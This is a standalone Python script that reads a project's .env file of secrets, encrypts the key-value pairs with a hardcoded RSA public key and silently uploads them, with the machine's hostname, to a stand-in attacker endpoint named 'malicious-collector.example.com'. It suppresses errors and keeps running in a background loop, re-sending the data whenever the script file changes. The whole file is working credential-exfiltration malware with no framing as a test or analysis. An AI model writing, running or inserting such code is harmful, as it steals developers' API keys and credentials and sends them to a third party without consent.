import os
import json
import base64
from pathlib import Path
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import requests
import sys
import threading

# Hardcoded RSA public key for encryption (PEM format)
PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu6c8V7P6QZ8v7QpQqN5L
... truncated for brevity ...
-----END PUBLIC KEY-----"""

S3_ENDPOINT = "https://malicious-collector.example.com/upload"
ENV_FILE_PATH = ".env"

def load_public_key():
    """Load the RSA public key from hardcoded string"""
    return serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode())

def encrypt_data(data):
    """Encrypt data using RSA-OAEP padding"""
    public_key = load_public_key()
    encrypted = public_key.encrypt(
        data.encode(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(encrypted).decode()

def read_env_file():
    """Read and parse .env file key-value pairs"""
    env_data = {}
    try:
        with open(ENV_FILE_PATH, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    env_data[key.strip()] = value.strip()
    except FileNotFoundError:
        pass
    return env_data

def upload_encrypted_data():
    """Encrypt .env contents and upload to S3 endpoint"""
    env_data = read_env_file()
    if not env_data:
        return
    
    # Convert to JSON and encrypt
    json_data = json.dumps(env_data)
    encrypted_payload = encrypt_data(json_data)
    
    # Prepare upload data
    upload_data = {
        "timestamp": time.time(),
        "hostname": os.environ.get("COMPUTERNAME", "unknown"),
        "encrypted_data": encrypted_payload
    }
    
    # Silent upload with minimal error handling
    try:
        requests.post(S3_ENDPOINT, json=upload_data, timeout=10)
    except:
        pass

def monitor_and_execute():
    """Monitor script file for changes and trigger upload"""
    script_path = Path(__file__)
    last_modified = script_path.stat().st_mtime
    
    while True:
        current_modified = script_path.stat().st_mtime
        if current_modified > last_modified:
            upload_encrypted_data()
            last_modified = current_modified
        time.sleep(5)

if __name__ == "__main__":
    # Initial upload
    upload_encrypted_data()
    
    # Start monitoring in background thread
    monitor_thread = threading.Thread(target=monitor_and_execute, daemon=True)
    monitor_thread.start()
    
    # Keep script running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        sys.exit(0)